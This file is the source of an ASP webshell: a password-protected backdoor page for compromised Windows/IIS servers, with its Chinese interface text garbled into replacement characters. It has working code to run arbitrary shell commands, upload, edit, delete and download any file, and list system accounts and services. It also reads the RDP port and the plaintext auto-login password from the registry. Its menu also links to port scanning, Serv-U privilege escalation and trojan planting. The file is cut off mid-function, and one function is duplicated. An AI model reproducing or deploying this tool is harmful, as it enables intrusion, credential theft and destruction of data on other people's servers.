<%

UserPass="fuckqq" '����


Server.Scripttimeout=999999999
Response.Buffer =true
On Error Resume Next
mName="In Way ...."
Copyright="Colorful Days ..."

Server.ScriptTimeout=999999999
Response.Buffer =true
On Error Resume Next
sub ShowErr()
If Err Then
RRS"<br><a href='javascript:history.back()'><br>&nbsp;" & Err.Description & "</a><br>"
Err.Clear:Response.Flush
End If
end sub
Sub RRS(str)
response.write(str)
End Sub
Function RePath(S)
RePath=Replace(S,"\","\\")
End Function
Function RRePath(S)
RRePath=Replace(S,"\\","\")
End Function
URL=Request.ServerVariables("URL")
ServerIP=Request.ServerVariables("LOCAL_ADDR")
Action=Request("Action")
RootPath=Server.MapPath(".")
WWWRoot=Server.MapPath("/")
serveru=request.servervariables("http_host")&url
serverp=UserPass
FolderPath=Request("FolderPath")
FName=Request("FName")
BackUrl="<br><br><center><a href='javascript:history.back()'>����</a></center>"
RRS"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">"
RRS"<title>"&mName1&" - "&ServerIP&" </title>"
RRS"<style type=""text/css"">"
RRS"body,td{font-size: 12px;background-color:#000000;color:lime;scrollbar-face-color: #000000; scrollbar-highlight-color: #008000;  scrollbar-shadow-color: #008000;  scrollbar-3dlight-color: #000000;  scrollbar-arrow-color: #000000;  scrollbar-track-color: #000000;  font-family: verdana;  scrollbar-darkshadow-color: #000000;}"
RRS"input,select,textarea{font-size: 12px;background-color:#ddd;border:1px solid #fff}"
RRS".C{background-color:#000000;border:0px}"
RRS".cmd{background-color:#000;color:lime}"
RRS"body{margin: 0px;margin-left:4px;}"
RRS"a{color:lime;text-decoration: none;}a:hover{color:lime;background:#000}"
RRS".am{color:#55AA66;font-size:11px;}"
RRS"</style>"
RRS"<script language=javascript>function killErrors(){return true;}window.onerror=killErrors;"
RRS"function yesok(){if (confirm(""ȷ��Ҫִ�д˲�����""))return true;else return false;}"
RRS"function runClock(){theTime = window.setTimeout(""runClock()"", 100);var today = new Date();var display= today.toLocaleString();window.status=""��"&AD&"  --""+display;}runClock();"
RRS"function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}"
RRS"function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction==""CopyFile""){DName = prompt(""�����븴�Ƶ�Ŀ���ļ�ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFile""){DName = prompt(""�������ƶ���Ŀ���ļ�ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""CopyFolder""){DName = prompt(""�������ƶ���Ŀ���ļ���ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFolder""){DName = prompt(""�������ƶ���Ŀ���ļ���ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""NewFolder""){DName = prompt(""������Ҫ�½����ļ���ȫ����"",FName);top.hideform.FName.value = DName;}else{DName = ""Other"";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = """";}}"
RRS"</script>"
rrs "<body"
If Action="" then RRS " scroll=no"
rrs ">"
Dim ObT(13,2)
ObT(0,0) = "Scripting.FileSystemObject"
ObT(0,2) = "�����ļ����"
ObT(1,0) = "wscript.shell"
ObT(1,2) = "ִ�����������"
ObT(2,0) = "ADOX.Catalog"
ObT(2,2) = "ACCESS�������"
ObT(3,0) = "JRO.JetEngine"
ObT(3,2) = "ACCESSѹ�����"
ObT(4,0) = "Scripting.Dictionary"
ObT(4,2) = "�������ϴ��������"
ObT(5,0) = "Adodb.connection"
ObT(5,2) = "���ݿ��������"
ObT(6,0) = "Adodb.Stream"
ObT(6,2) = "�������ϴ����"
ObT(7,0) = "SoftArtisans.FileUp"
ObT(7,2) = "�ļ��ϴ�SA-FileUp���"
ObT(8,0) = "LyfUpload.UploadFile"
ObT(8,2) = "���Ʒ��ļ��ϴ����"
ObT(9,0) = "Persits.Upload.1"
ObT(9,2) = "ASPUpload �ļ��ϴ����"
ObT(10,0) = "JMail.SmtpMail"
ObT(10,2) = "JMail �ʼ��շ����"
ObT(11,0) = "CDONTS.NewMail"
ObT(11,2) = "����SMTP�������"
ObT(12,0) = "SmtpMail.SmtpMail.1"
ObT(12,2) = "SmtpMail�������"
ObT(13,0) = "Microsoft.XMLHTTP"
ObT(13,2) = "���ݴ������"
For i=0 To 13
Set T=Server.CreateObject(ObT(i,0))
If -2147221005 <> Err Then
IsObj=" ��"
Else
IsObj=" ��"
Err.Clear
End If
Set T=Nothing
ObT(i,1)=IsObj
Next
If FolderPath<>"" then
Session("FolderPath")=RRePath(FolderPath)
End If
If Session("FolderPath")="" Then
FolderPath=RootPath
Session("FolderPath")=FolderPath
End if
Function MainForm()
RRS"<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">"
RRS"<input type=""hidden"" name=""Action"">"
RRS"<input type=""hidden"" name=""FName"">"
RRS"</form>"
RRS"<table width='100%' height='100%'  border=0 cellpadding='0' cellspacing='0'>"
RRS"<tr><td height='30' colspan='2'>"
RRS"<table width='100%'>"
RRS"<form name='addrform' method='post' action='"&URL&"' target='_parent'>"
RRS"<tr><td width='60' align='center'>��ַ����</td><td>"
RRS"<input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>"
RRS"</td><td width='140' align='center'><input name='Submit' type='submit' value='ת��'> <input type='submit' value='ˢ��������' onclick='FileFrame.location.reload()'>"
RRS"</td></tr></form></table></td></tr><tr><td width='170'>"
RRS"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td>"
RRS"<td>"
RRS"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe>"
RRS"</td></tr></table>"
End Function
if request("days")="Colorful" then
Session("Colorful_Days") = UserPass
URL()
end if
Function MainForm()
RRS"<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">"
RRS"<input type=""hidden"" name=""Action"">"
RRS"<input type=""hidden"" name=""FName"">"
RRS"</form>"
RRS"<table width='100%' height='100%'  border=0 cellpadding='0' cellspacing='0'>"
RRS"<tr><td height='30' colspan='2'>"
RRS"<table width='100%'>"
RRS"<form name='addrform' method='post' action='"&URL&"' target='_parent'>"
RRS"<tr><td width='60' align='center'>��ַ����</td><td>"
RRS"<input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>"
RRS"</td><td width='140' align='center'><input name='Submit' type='submit' value='ת��'> <input type='submit' value='ˢ��������' onclick='FileFrame.location.reload()'>"
RRS"</td></tr></form></table></td></tr><tr><td width='170'>"
RRS"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td>"
RRS"<td>"
RRS"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe>"
RRS"</td></tr></table>"
End Function
Function MainMenu()
RRS"<table width='100%' cellspacing='0' cellpadding='0'>"
RRS"<tr><td height='5'></td></tr>"
RRS"<tr><td><center><a href='"&SiteURL2&"' target='_blank'><font color=red>"&mName2&"</font></center></a><hr hight=1 width='100%'>"
RRS"</td></tr>"
If ObT(0,1)=" ��" Then
RRS"<tr><td height='24'>��Ȩ��</td></tr>"
Else
RRS"<tr><td height=22 onmouseover=""menu1.style.display=''""> ���鿴Ӳ��<div id=menu1 style=""width:100%;display='none'"" onmouseout=""menu1.style.display='none'"">"
Set ABC=New LBF:RRS ABC.ShowDriver():Set ABC=Nothing
RRS"</div></td></tr><tr><td height='20'><a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>->վ���Ŀ¼</a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>��������Ŀ¼</a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:ShowFolder(""C:\\Program Files"")'>��Program Files</a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents"")'>->Documents</a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere"")'>->pcAnywhere</a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\����ʼ���˵�\\����"")'>->��ʼ <b>��</b> ����<hr></a></td></tr>"
End If
RRS"<tr><td height='22'><a href='?Action=Course' target='FileFrame'>��ϵͳ����-�û��˺�</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=getTerminalInfo' target='FileFrame'>���ն˶˿�-�Զ���¼</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=ServerInfo' target='FileFrame'>��������Ϣ-���֧��</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=Cmd1Shell' target='FileFrame'>��ִ��CMD����</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=ScanPort' target='FileFrame'>���˿�ɨ����</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=Servu' target='FileFrame'>��Serv-u��Ȩ</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=ReadREG' target='FileFrame'>����ȡע���</a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\NewFolder")&""",""NewFolder"")'>���½�Ŀ¼<hr></a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=EditFile' target='FileFrame'>���½��ı�</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=UpFile' target='FileFrame'>���ϴ��ļ�</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=kmuma' target='FileFrame'>������ľ��</b></a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=Cplgm&M=1' target='FileFrame'>���߼�����</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=Cplgm&M=2' target='FileFrame'>����������</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=Cplgm&M=3' target='FileFrame'>�������滻</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=plgm' target='FileFrame'></b>���ͼ�����</a></b></td></tr>"
RRS"<tr><td height='22'><a href='?Action=Logout' target='_top'>���˳���¼</a></td></tr>"
RRS"<tr><td align=center style='color:red'><hr>"&Copyright2&"</td></tr></table>"
RRS"</table>"
End Function
Sub unPack(thePath)
On Error Resume Next
Server.ScriptTimeOut = 5000
Dim rs, ws, str, conn, stream, connStr, theFolder
str = Server.MapPath(".") & "\"
Set rs = CreateObject("ADODB.RecordSet")
Set stream = CreateObject("ADODB.Stream")
Set conn = CreateObject("ADODB.Connection")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"
conn.Open connStr
rs.Open "FileData", conn, 1, 1
stream.Open
stream.Type = 1
Do Until rs.Eof
theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
If fsoX.FolderExists(str & theFolder) = False Then
createFolder(str & theFolder)
End If
stream.SetEos()
stream.Write rs("fileContent")
stream.SaveToFile str & rs("thePath"), 2
rs.MoveNext
Loop
rs.Close
conn.Close
stream.Close
Set ws = Nothing
Set rs = Nothing
Set stream = Nothing
Set conn = Nothing
End Sub
Sub createFolder(thePath)
Dim i
i = Instr(thePath, "\")
Do While i > 0
If fsoX.FolderExists(Left(thePath, i)) = False Then
fsoX.CreateFolder(Left(thePath, i - 1))
End If
If InStr(Mid(thePath, i + 1), "\") Then
i = i + Instr(Mid(thePath, i + 1), "\")
Else
i = 0
End If
Loop
End Sub
Function Course()
SI="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
SI=SI&"<tr><td height='20' colspan='3' align='center' bgcolor='menu'>ϵͳ�û������</td></tr>"
on error resume next
FOR EACH OBJ IN GETOBJECT("WinNT://.")
err.clear
if OBJ.StartType="" then
SI=SI&"<tr>"
SI=SI&"<td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"
SI=SI&obj.Name
SI=SI&"</td><td bgcolor=""#FFFFFF"">&nbsp;"
SI=SI&"ϵͳ�û�(��)"
SI=SI&"</td></tr>"
SI0="<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">&nbsp;</td></tr>"
end if
if OBJ.StartType=2 then lx="�Զ�"
if OBJ.StartType=3 then lx="�ֶ�"
if OBJ.StartType=4 then lx="����"
if LCase(mid(obj.path,4,3))<>"win" and OBJ.StartType=2 then
SI1=SI1&"<tr><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[��������:"&lx&"]<font color=#FF0000>&nbsp;"&obj.path&"</font></td></tr>"
else
SI2=SI2&"<tr><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[��������:"&lx&"]<font color=#3399FF>&nbsp;"&obj.path&"</font></td></tr>"
end if
next
RRS SI&SI0&SI1&SI2&"</table>"
End Function
Function ServerInfo()
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
SI=SI&"<tr><td height='20' colspan='3' align='center' bgcolor='menu'>�����������Ϣ</td></tr>"
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>��������</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&request.serverVariables("SERVER_NAME")&"</td></tr>"
SI=SI&"<form method=get action='http://www.ip.cn/whois.php' name='f' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>������IP</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"
SI=SI&"<input type='text' name='q' size='15' value='"&Request.ServerVariables("LOCAL_ADDR")&"'style='border:0px'><input type='submit' value='��ѯ'style='border:0px'><input type='hidden' name='action' value='2'></td></tr></form>"
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>������ʱ��</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&now&"&nbsp;</td></tr>"
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>������CPU����</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("NUMBER_OF_PROCESSORS")&"</td></tr>"
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>����������ϵͳ</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("OS")&"</td></tr>"
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>WEB�������汾</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("SERVER_SOFTWARE")&"</td></tr>"
For i=0 To 13
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>"&ObT(i,0)&"</td><td bgcolor='#FFFFFF'>"&ObT(i,1)&"</td><td bgcolor='#FFFFFF' align=left>"&ObT(i,2)&"</td></tr>"
Next
RRS SI
End Function
Function DownFile(Path)
Response.Clear
Set OSM = CreateObject(ObT(6,0))
OSM.Open
OSM.Type = 1
OSM.LoadFromFile Path
sz=InstrRev(path,"\")+1
Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(path,sz)
Response.AddHeader "Content-Length", OSM.Size
Response.Charset = "UTF-8"
Response.ContentType = "application/octet-stream"
Response.BinaryWrite OSM.Read
Response.Flush
OSM.Close
Set OSM = Nothing
End Function
Function HTMLEncode(S)
if not isnull(S) then
S = replace(S, ">", "&gt;")
S = replace(S, "<", "&lt;")
S = replace(S, CHR(39), "&#39;")
S = replace(S, CHR(34), "&quot;")
S = replace(S, CHR(20), "&nbsp;")
HTMLEncode = S
end if
End Function
Function UpFile()
If Request("Action2")="Post" Then
Set U=new UPC : Set F=U.UA("LocalFile")
UName=U.form("ToPath")
If UName="" Or F.FileSize=0 then
SI="<br>�������ϴ�����ȫ·����ѡ��һ���ļ��ϴ�!"
Else
F.SaveAs UName
If Err.number=0 Then
SI="<center><br><br><br>�ļ�"&UName&"�ϴ��ɹ���</center>"
End if
End If
Set F=nothing:Set U=nothing
SI=SI&BackUrl
RRS SI
ShowErr()
Response.End
End If
SI="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
SI=SI&"<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"
SI=SI&"<tr><td>"
SI=SI&"�ϴ�·����<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\upfile.asp")&"' size='40'>"
SI=SI&" <input name='LocalFile' type='file'  size='25'>"
SI=SI&" <input type='submit' name='Submit' value='�ϴ�'>"
SI=SI&"</td></tr></form></table>"
RRS SI
End Function
Function Cmd1Shell()
checked=" checked"
If Request("SP")<>"" Then Session("ShellPath") = Request("SP")
ShellPath=Session("ShellPath")
if ShellPath="" Then ShellPath = "cmd"
if Request("wscript")<>"yes" then checked=""
If Request("cmd")<>"" Then DefCmd = Request("cmd")
SI="<form method='post'>"
SI=SI&"SHELL·����<input name='SP' value='"&ShellPath&"' Style='width:70%'>&nbsp;&nbsp;"
SI=SI&"<input class=c type='checkbox' name='wscript' value='yes'"&checked&">WScript.Shell"
SI=SI&"<input name='cmd' Style='width:92%' value='"&DefCmd&"'> <input type='submit' value='ִ��'><textarea Style='width:100%;height:440;' class='cmd'>"
If Request.Form("cmd")<>"" Then
if Request.Form("wscript")="yes" then
Set CM=CreateObject(ObT(1,0))
Set DD=CM.exec(ShellPath&" /c "&DefCmd)
aaa=DD.stdout.readall
SI=SI&aaa
else
On Error Resume Next
Set ws=Server.CreateObject("WScript.Shell")
Set ws=Server.CreateObject("WScript.Shell")
Set fso=Server.CreateObject("Scripting.FileSystemObject")
szTempFile = server.mappath("cmd.txt")
Call ws.Run (ShellPath&" /c " & DefCmd & " > " & szTempFile, 0, True)
Set fs = CreateObject("Scripting.FileSystemObject")
Set oFilelcx = fs.OpenTextFile (szTempFile, 1, False, 0)
aaa=Server.HTMLEncode(oFilelcx.ReadAll)
oFilelcx.Close
Call fso.DeleteFile(szTempFile, True)
SI=SI&aaa
end if
End If
SI=SI&chr(13)&"</textarea></form>"
RRS SI
End Function
if session("Colorful_Days")<>UserPass then
if request.form("pass")<>"" then
if request.form("pass")=UserPass then
session("Colorful_Days")=UserPass
response.redirect url
else
rrs"<br><br><br><b><div align=center><font size='14' color='red'>Why ?</font></b> <br><br><br><br><b><div align=center><font size='14' color='lime'></font></b></p>"
end if
else
si="<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br>"&mname&"</a><hr><form action='"&url&"' method='post'>���룺<input name='pass' type='password' size='22'> <input type='submit' value='��¼'><hr>"&Copyright&"</center>"
if instr(SI,SIC)<>0 then rrs sI
end if
response.end
end if
Dim T1
Class UPC
Dim D1,D2
Public Function Form(F)
F=lcase(F)
If D1.exists(F) then:Form=D1(F):else:Form="":end if
End Function
Public Function UA(F)
F=lcase(F)
If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
End Function
Private Sub Class_Initialize
Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
set D1=CreateObject(ObT(4,0))
if Request.TotalBytes<1 then Exit Sub
set T1 = CreateObject(ObT(6,0))
T1.Type = 1 : T1.Mode =3 : T1.Open
T1.Write  Request.BinaryRead(Request.TotalBytes)
T1.Position=0 : TDa =T1.Read : DStart = 1
DEnd = LenB(TDa)
set D2=CreateObject(ObT(4,0))
vbCrlf = chrB(13) & chrB(10)
set T2 = CreateObject(ObT(6,0))
TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
TLen = LenB (TSt)
DStart=DStart+TLen+1
while (DStart + 10) < DEnd
DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
T2.Type = 1 : T2.Mode =3 : T2.Open
T1.Position = DStart
T1.CopyTo T2,DIEnd-DStart
T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
TIn = T2.ReadText : T2.Close
DStart = InStrB(DIEnd,TDa,TSt)
FStart = InStr(22,TIn,"name=""",1)+6
FEnd = InStr(FStart,TIn,"""",1)
UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
if InStr (45,TIn,"filename=""",1) > 0 then
set TFL=new FIF
FStart = InStr(FEnd,TIn,"filename=""",1)+10
FEnd = InStr(FStart,TIn,"""",1)
FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
FEnd = InStr(FStart,TIn,vbCr)
TFL.FileStart =DIEnd
TFL.FileSize = DStart -DIEnd -3
if not D2.Exists(UpName) then
D2.add UpName,TFL
end if
else
T2.Type =1 : T2.Mode =3 : T2.Open
T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
T2.Position = 0 : T2.Type = 2
T2.Charset ="gb2312"
SFV = T2.ReadText
T2.Close
if D1.Exists(UpName) then
D1(UpName)=D1(UpName)&", "&SFV
else
D1.Add UpName,SFV
end if
end if
DStart=DStart+TLen+1
wend
TDa=""
set T2 =nothing
End Sub
Private Sub Class_Terminate
if Request.TotalBytes>0 then
D1.RemoveAll:D2.RemoveAll
set D1=nothing:set D2=nothing
T1.Close:set T1 =nothing
end if
End Sub
End Class
Class FIF
dim FileSize,FileStart
Private Sub Class_Initialize
FileSize = 0
FileStart= 0
End Sub
Public function SaveAs(F)
dim T3
SaveAs=true
if trim(F)="" or FileStart=0 then exit function
set T3=CreateObject(ObT(6,0))
T3.Mode=3 : T3.Type=1 : T3.Open
T1.position=FileStart
T1.copyto T3,FileSize
T3.SaveToFile F,2
T3.Close
set T3=nothing
SaveAs=false
end function
End Class
Class LBF
Dim CF
Private Sub Class_Initialize
SET CF=CreateObject(ObT(0,0))
End Sub
Private Sub Class_Terminate
Set CF=Nothing
End Sub
Function ShowDriver()
For Each D in CF.Drives
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>���ش��� ("&D.DriveLetter&":)</a><br>"
Next
End Function
Function Show1File(Path)
Set FOLD=CF.GetFolder(Path)
i=0
SI="<table width='100%' border='0' cellspacing='0' cellpadding='0'><tr>"
For Each F in FOLD.subfolders
SI=SI&"<td height=10>"
SI=SI&"<a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")' title=""��""><font face='wingdings' size='6'>0</font>"&F.Name&"</a>"
SI=SI&" _<a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='����'>����</a>"
SI=SI&"  <a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")'  onclick='return yesok()' class='am' title='ɾ��'>ɾ��</a>"
SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")'  onclick='return yesok()' class='am' title='�ƶ�'>�ƶ�</a>"
SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""DownFile"")'  onclick='return yesok()' class='am' title='����'>����</a></td>"
i=i+1
If i mod 3 = 0 then SI=SI&"</tr><tr>"
Next
SI=SI&"</tr><tr><td height=2></td></tr></table>"
RRS SI &"<hr noshade color=""#CCCCCC"" size=1 color=""#"" />" : SI=""
For Each L in Fold.files
SI="<table width='100%' border='0' cellspacing='0' cellpadding='0'>"
SI=SI&"<tr style='boungroup-color:#'>"
SI=SI&"<td height='30'><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='����'><font face='wingdings' size='4'>2</font>"&L.Name&"</a></td>"
SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='�༭'>�༭</a></td>"
SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>ɾ��</a></td>"
SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='����'>����</a></td>"
SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='�ƶ�'>�ƶ�</a></td>"
SI=SI&"<td width='50' align=""center"">"&clng(L.size/1024)&"K</td>"
SI=SI&"<td width='200' align=""center"">"&L.Type&"</td>"
SI=SI&"<td width='160'>"&L.DateLastModified&"</td>"
SI=SI&"</tr></table>"
RRS SI:SI=""
Next
Set FOLD=Nothing
End function
Function DelFile(Path)
If CF.FileExists(Path) Then
CF.DeleteFile Path
SI="<center><br><br><br>�ļ� "&Path&" ɾ���ɹ���</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
Function EditFile(Path)
If Request("Action2")="Post" Then
Set T=CF.CreateTextFile(Path)
T.WriteLine Request.form("content")
T.close
Set T=nothing
SI="<center><br><br><br>�ļ�����ɹ���</center>"
SI=SI&BackUrl
RRS SI
Response.End
End If
If Path<>"" Then
Set T=CF.opentextfile(Path, 1, False)
Txt=HTMLEncode(T.readall)
T.close
Set T=Nothing
Else
Path=Session("FolderPath")&"\ver.asp":Txt="�½��ļ�"
End If
SI=SI&"<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'>"
SI=SI&"<input name='Action' value='EditFile' Type='hidden'>"
SI=SI&"<input name='FName' value='"&Path&"' style='width:100%'><br>"
SI=SI&"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br>"
SI=SI&"<hr><input name='goback' type='button' value='����' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='����'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='����'></form>"
RRS SI
End Function
Function CopyFile(Path)
Path = Split(Path,"||||")
If CF.FileExists(Path(0)) and Path(1)<>"" Then
CF.CopyFile Path(0),Path(1)
SI="<center><br><br><br>�ļ�"&Path(0)&"���Ƴɹ���</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
Function MoveFile(Path)
Path = Split(Path,"||||")
If CF.FileExists(Path(0)) and Path(1)<>"" Then
CF.MoveFile Path(0),Path(1)
SI="<center><br><br><br>�ļ�"&Path(0)&"�ƶ��ɹ���</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
Function DelFolder(Path)
If CF.FolderExists(Path) Then
CF.DeleteFolder Path
SI="<center><br><br><br>Ŀ¼"&Path&"ɾ���ɹ���</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
Function CopyFolder(Path)
Path = Split(Path,"||||")
If CF.FolderExists(Path(0)) and Path(1)<>"" Then
CF.CopyFolder Path(0),Path(1)
SI="<center><br><br><br>Ŀ¼"&Path(0)&"���Ƴɹ���</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
Function MoveFolder(Path)
Path = Split(Path,"||||")
If CF.FolderExists(Path(0)) and Path(1)<>"" Then
CF.MoveFolder Path(0),Path(1)
SI="<center><br><br><br>Ŀ¼"&Path(0)&"�ƶ��ɹ���</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
Function NewFolder(Path)
If Not CF.FolderExists(Path) and Path<>"" Then
CF.CreateFolder Path
SI="<center><br><br><br>Ŀ¼"&Path&"�½��ɹ���</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
End Class
sub getTerminalInfo()
On Error Resume Next
Set wsX = Server.CreateObject("WScript.Shell")
Dim terminalPortPath, terminalPortKey, termPort
Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword
terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
terminalPortKey = "PortNumber"
termPort = wsX.RegRead(terminalPortPath & terminalPortKey)
RRS "�ն˷���˿ڼ��Զ���¼<hr/><ol>"
If termPort = "" Or Err.Number <> 0 Then
RRS"�޷��õ��ն˷���˿�, ����Ȩ���Ƿ��Ѿ��ܵ�����.<br/>"
Else
RRS "��ǰ�ն˷���˿�: " & termPort & "<br/>"
End If
autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
autoLoginEnableKey = "AutoAdminLogon"
autoLoginUserKey = "DefaultUserName"
autoLoginPassKey = "DefaultPassword"
isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
If isAutoLoginEnable = 0 Then
RRS "ϵͳ�Զ���¼����δ����<br/>"
Else
autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
RRS "�Զ���¼��ϵͳ�ʻ�: " & autoLoginUsername & "<br>"
autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
If Err Then
Err.Clear
RRS "False"
End If
RRS "�Զ���¼���ʻ�����: " & autoLoginPassword & "<br>"
End If
RRS "</ol>"
End Sub
sub ReadREG()
RRS "ע����ֵ��ȡ:<hr/>"
RRS "<form method=post>"
RRS "<input type=hidden value=readReg name=theAct>"
RRS "<input name=thePath value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName' size=80>"
RRS " <input type=submit value=' ��ȡ '>"
RRS "<span id=regeditInfo style='display:none;'><hr/>"
RRS "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\Dont-DisplayLastUserName,REG_SZ,1 {����ʾ�ϴε�¼�û�}<br/>"
